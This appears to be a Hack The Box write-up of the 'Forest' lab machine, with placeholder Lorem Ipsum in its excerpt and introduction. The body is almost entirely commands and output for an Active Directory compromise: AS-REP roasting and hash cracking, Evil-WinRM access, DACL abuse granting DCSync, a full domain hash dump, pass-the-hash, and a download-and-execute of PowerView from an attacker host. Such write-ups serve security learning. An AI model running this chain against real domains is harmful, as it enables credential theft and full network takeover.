---
layout: single
title: Forest - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-10-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-forest/forest_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-forest/forest_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n 10.10.10.161
    PORT     STATE SERVICE      VERSION
    53/tcp   open  domain?
    88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-15 13:10:10Z)
    135/tcp  open  msrpc        Microsoft Windows RPC
    139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
    389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
    464/tcp  open  kpasswd5?
    593/tcp  open  http-rpc-epmap   Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ldapssl
    3268/tcp open  globalcatLDAP         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    5985/tcp  open  wsman
    9389/tcp  open  adws
    47001/tcp open  winrm
    49664/tcp open  unknown
    49665/tcp open  unknown
    49666/tcp open  unknown
    49667/tcp open  unknown
    49669/tcp open  unknown
    49670/tcp open  unknown
    49671/tcp open  unknown
    49678/tcp open  unknown
    49697/tcp open  unknown
    49902/tcp open  unknown

    Host script results:
    |_clock-skew: mean: 2h25m50s, deviation: 4h02m30s, median: 5m49s
    | smb-os-discovery:
    |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
    |   Computer name: FOREST
    |   NetBIOS computer name: FOREST\x00
    |   Domain name: htb.local
    |   Forest name: htb.local
    |   FQDN: FOREST.htb.local
    |_  System time: 2019-10-15T06:12:29-07:00
    | smb-security-mode:
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2019-10-15T13:12:28
    |_  start_date: 2019-10-15T03:25:51


2. Enum with rpcclient
    root@p3:/opt# rpcclient -U "" -N 10.10.10.161
    rpcclient $> enumdomusers
    user:[Administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[DefaultAccount] rid:[0x1f7]
    user:[$331000-VK4ADACQNUCA] rid:[0x463]
    user:[SM_2c8eef0a09b545acb] rid:[0x464]
    user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
    user:[SM_75a538d3025e4db9a] rid:[0x466]
    user:[SM_681f53d4942840e18] rid:[0x467]
    user:[SM_1b41c9286325456bb] rid:[0x468]
    user:[SM_9b69f1b9d2cc45549] rid:[0x469]
    user:[SM_7c96b981967141ebb] rid:[0x46a]
    user:[SM_c75ee099d0a64c91b] rid:[0x46b]
    user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
    user:[HealthMailboxc3d7722] rid:[0x46e]
    user:[HealthMailboxfc9daad] rid:[0x46f]
    user:[HealthMailboxc0a90c9] rid:[0x470]
    user:[HealthMailbox670628e] rid:[0x471]
    user:[HealthMailbox968e74d] rid:[0x472]
    user:[HealthMailbox6ded678] rid:[0x473]
    user:[HealthMailbox83d6781] rid:[0x474]
    user:[HealthMailboxfd87238] rid:[0x475]
    user:[HealthMailboxb01ac64] rid:[0x476]
    user:[HealthMailbox7108a4e] rid:[0x477]
    user:[HealthMailbox0659cc1] rid:[0x478]
    user:[sebastien] rid:[0x479]
    user:[lucinda] rid:[0x47a]
    user:[svc-alfresco] rid:[0x47b]
    user:[andy] rid:[0x47e]
    user:[mark] rid:[0x47f]
    user:[santi] rid:[0x480]

    INTERESTING USERS:
    rpcclient $> queryuser 0x47b    (svc-alfresco)
      logon_count:	0x00000007
    rpcclient $> queryuser 0x479    (sebastien)
      logon_count:	0x00000008
    rpcclient $> queryuser 0x1f4    (Administrator)
      logon_count:	0x00000031

3. Enumerate hashes for interesting users with Impacket tool GetNPUsers
    root@p3:/opt/impacket/examples# ./GetNPUsers.py htb.local/ -usersfile /opt/htb/machines/forest/users-forest.txt -format hashcat -dc-ip 10.10.10.161 -outputfile hash.txt
    root@p3:/opt/impacket/examples# cat hash.txt
      $krb5asrep$23$svc-alfresco@HTB.LOCAL:c6b386e4e646a26313188b25a9718d8f$df73ae7a0799b0763c99ebd9bae61f41354facff05b4cceb76ee4563009bf84db6640e6ebefea558fe9364c6fccb6eacb9f79acaf539ba7dffe13307d89b784c7ad16c838962d6256e27326834cfcc8389b782808bddec98a2685b535fd1d9257f22561507caaec13c6a319e5fe0d9980cf74355262fe3aa2f56a254ac0cf0031b5f61111c3c35adcd7cc4b8039bfc69210a60ed8fc4adb2d269911c33eab9f973e374f2b52ba68c452fbf961185d85ab8f9de7216cc4841474e1bbff324258c2df7bc91bb28bc51d164c5a3e6edc8b8c4da32258842f760c4548ea023b91f158eb483a35f09

4. Crack the hash with hashcat
    root@p3:/opt/htb/machines/forest# hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked-hash.txt --force
    root@p3:/opt/htb/machines/forest# cat cracked-hash.txt
      $krb5asrep$23$svc-alfresco@HTB.LOCAL:c6b386e4e646a26313188b25a9718d8f$df73ae7a0799b0763c99ebd9bae61f41354facff05b4cceb76ee4563009bf84db6640e6ebefea558fe9364c6fccb6eacb9f79acaf539ba7dffe13307d89b784c7ad16c838962d6256e27326834cfcc8389b782808bddec98a2685b535fd1d9257f22561507caaec13c6a319e5fe0d9980cf74355262fe3aa2f56a254ac0cf0031b5f61111c3c35adcd7cc4b8039bfc69210a60ed8fc4adb2d269911c33eab9f973e374f2b52ba68c452fbf961185d85ab8f9de7216cc4841474e1bbff324258c2df7bc91bb28bc51d164c5a3e6edc8b8c4da32258842f760c4548ea023b91f158eb483a35f09:s3rvice

    # NOTE: User:Pass = svc-alfresco:s3rvice

5. Login using Evil-WinRM and found creds to grab user.txt
    root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice

    Info: Starting Evil-WinRM shell v1.7
    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cat ../Desktop/user.txt
    e5e4****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerate the DC environment using BloodHound.
    *Evil-WinRM* PS C:\> upload ../BloodHound/Ingestors/SharpHound.ps1
    *Evil-WinRM* PS C:\> Import-module C:\Users\svc-alfresco\Documents\SharpHound.ps1
    *Evil-WinRM* PS C:\> Get-Help Invoke-BloodHound
    *Evil-WinRM* PS C:\> Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
    *Evil-WinRM* PS C:\> download 20191024033946_BloodHound.zip

2. Start neo4j console and bloodhoud, and import the zip by drag-and-drop it into the window.
    root@p3:/opt# neo4j console
    root@p3:/opt# bloodhound

  You'll find 'Find Shortest Paths to Domain Admins' to look something like this:
  svc-alfresco
    |-- (MemberOf) --> Group: Service Accounts
         |-- (MemberOf) --> Group: Privileged IT Accounts
                   |-- (MemberOf) --> Group: Account Operators
                         |-- (GenericAll) --> Group: Exchange Windows Permissions
                                                            |-- (WriteDacl) --> HTB.LOCAL
                                                                        |-- (Contains) --> User: Administrator

# svc-alfresco has the privs to create new users, or change passwords of users, in group Exchange Windows Permissions
# (indicated by the 'MemberOf'-chain and GenericAll towards the Group)
# Create a new user in the group Exchange Windows Permissions, to get closer to Administrator user.

3. Create new user in "Exchange Windows Permissions"-Group to pivot closer to Administrator
    *Evil-WinRM* PS C:\> net user p3 Password123! /add
    The command completed successfully.

    *Evil-WinRM* PS C:\> net group "exchange windows permissions" p3 /add /domain
    The command completed successfully.

    *Evil-WinRM* PS C:\> net localgroup "Remote Management Users" /add p3
    The command completed successfully.


    root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.161 -u p3 -p Password123!

    Info: Starting Evil-WinRM shell v1.7
    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\p3\Documents> whoami
    htb\p3
    *Evil-WinRM* PS C:\Users\p3\Documents> net user p3 /domain
    User name                    p3
    Full Name
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never

    Password last set            10/24/2019 5:14:48 AM
    Password expires             12/5/2019 5:14:48 AM
    Password changeable          10/25/2019 5:14:48 AM
    Password required            Yes
    User may change password     Yes

    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   Never

    Logon hours allowed          All

    Local Group Memberships      *Remote Management Use
    Global Group memberships     *Exchange Windows Perm*Domain Users      <------------
    The command completed successfully.

4. Group 'Exchange Windows Permissions' has WriteDacl to HTB.LOCAL which grants the ability to modify the
   DACL in the object security descriptor. Exploit this using aclpwn or PowerView: Add-DomainObjectAcl.

   NOTE: I was not able to get it to work with PowerView.

    root@p3:/opt# aclpwn -f p3@htb.local -d htb.local -s 10.10.10.161
    Please supply the password or LM:NTLM hashes of the account you are escalating from:
    [+] Path found!
    Path: (p3@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
    [-] Memberof -> continue
    [-] Modifying domain DACL to give DCSync rights to p3
    [+] Dacl modification successful
    [+] Finished running tasks
    [+] Saved restore state to aclpwn-20191024-171539.restore

5. With the new DCSync rights to user p3 we are able to extract hashes from the DC using Impacket tool secretsdump
    root@p3:/opt# impacket-secretsdump htb.local/p3@forest.htb.local -just-dc
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

    Password:
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
    htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
    htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
    htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
    htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
    htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
    htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
    htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
    htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
    htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
    htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
    htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
    htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
    htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
    htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
    htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
    htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
    p3:7601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
    FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:be56ce6584d1219800617c9d1b58e8f5:::
    EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
    [*] Kerberos keys grabbed
    krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
    krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
    krbtgt:des-cbc-md5:9dd5647a31518ca8
    htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
    htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
    htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
    htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
    htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
    htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
    htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
    htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
    htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
    htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
    htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
    htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
    htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
    htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
    htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
    htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
    htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
    htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
    htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
    htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
    htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
    htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
    htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
    htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
    htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
    htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
    htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
    htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
    htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
    htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
    htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
    htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
    htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
    htb.local\sebastien:aes256-cts-hmac-sha1-96:6f8ab2c7e297c3a11b31d0a3ba7e1118286008574182db0d90ef8bd8f96acd34
    htb.local\sebastien:aes128-cts-hmac-sha1-96:35f41fce714e9a624e25a6411069e869
    htb.local\sebastien:des-cbc-md5:529dc47a4cdcf1c2
    htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
    htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
    htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
    htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
    htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
    htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
    htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
    htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
    htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
    htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
    htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
    htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
    htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
    htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
    htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
    p3:aes256-cts-hmac-sha1-96:ac3ab772908655869d3509d4c6d1e0d418d55b48e796548566640142ba18e224
    p3:aes128-cts-hmac-sha1-96:eefda4ed27816b2235d24018e98b649c
    p3:des-cbc-md5:43da5ec26d7cf4f2
    FOREST$:aes256-cts-hmac-sha1-96:6519e869415cad7deb8aa5dcfd89db611ee918200c2f8dbe0629f86b78f674dc
    FOREST$:aes128-cts-hmac-sha1-96:b3ae4c5bada7d4eddc80fcebe409bc77
    FOREST$:des-cbc-md5:c7e33bb334863e9d
    EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
    EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
    EXCH01$:des-cbc-md5:8c45f44c16975129
    [*] Cleaning up...


(OPTIONAL)
Same can also be done using PowerView. Even though we get a lot of errors, the commands still go through and are successfull.

*Evil-WinRM* PS C:\Users\p3\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8080/PowerView.ps1')
  Cannot bind argument to parameter 'Type' because it is null.
  At line:20775 char:31
  +     lgrmi2_sidusage = field 1 $SID_NAME_USE
  +                               ~~~~~~~~~~~~~
      + CategoryInfo          : InvalidData: (:) [field], ParameterBindingValidationException
      + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,field
  Cannot bind argument to parameter 'Type' because it is null.
  At line:20808 char:21
  +     Flags = field 2 $DsDomainFlag
  +                     ~~~~~~~~~~~~~
      + CategoryInfo          : InvalidData: (:) [field], ParameterBindingValidationException
      + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,field

*Evil-WinRM* PS C:\Users\p3\Documents> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity p3 -Rights DCSync
  Exception calling "GetNames" with "1" argument(s): "Value cannot be null.
  Parameter name: enumType"
  At line:6564 char:9
  +         $UACValueNames = [Enum]::GetNames($UACEnum)
  +         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
      + FullyQualifiedErrorId : ArgumentNullException
  Cannot validate argument on parameter 'ValidateSet'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again.


6. Again, use Impacket but this time pass-the-hash to get Administrator account and root flag
    root@p3:/opt/impacket/examples# python wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@forest.htb.local
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

    [*] SMBv3.0 dialect used
    [!] Launching semi-interactive shell - Careful what you execute
    [!] Press help for extra shell commands
    C:\>whoami
    htb\administrator

    C:\>type C:\Users\Administrator\Desktop\root.txt
    f048****************************




██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


SIMILAR HTB BOX: Reel

- BloodHound 1.3 – The ACL Attack Path Update
   https://wald0.com/?p=112
     WriteDACL: The ability to write a new ACE to the target object’s DACL. For example, an attacker may write a new ACE to the target
     object DACL giving the attacker “full control” of the target object. Abused with Add-NewADObjectAccessControlEntry.

- An ACE Up the Sleeve
   https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf
    WriteDacl grants the ability to modify the DACL in the object security descriptor. Abusable with PowerView: Add-DomainObjectAcl

- BloodHound with Kali Linux: 101
    https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux

- Attacking Active Directory Permissions with BloodHound
    https://blog.stealthbits.com/attacking-active-directory-permissions-with-bloodhound/

- ACLPWN
    https://github.com/fox-it/aclpwn.py
